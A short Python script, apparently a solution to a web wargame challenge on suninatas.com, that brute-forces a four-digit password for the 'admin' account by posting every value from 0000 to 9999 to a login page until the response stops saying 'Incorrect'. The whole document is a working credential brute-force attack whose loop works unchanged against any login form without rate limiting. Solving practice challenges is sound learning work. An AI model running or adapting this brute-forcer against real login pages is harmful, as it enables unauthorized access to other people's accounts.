import requests

url = "http://suninatas.com/challenge/web08/web08.asp"


for pw in range(0,10000) :
    data = {'id' : 'admin' , 'pw' : str(pw).zfill(4)}
    req =requests.post(url,data=data)
    if (req.text).find('Incorrect') == -1 :
        print('correct : ', pw,"\n")
        input()
    print(pw , ' X\n')
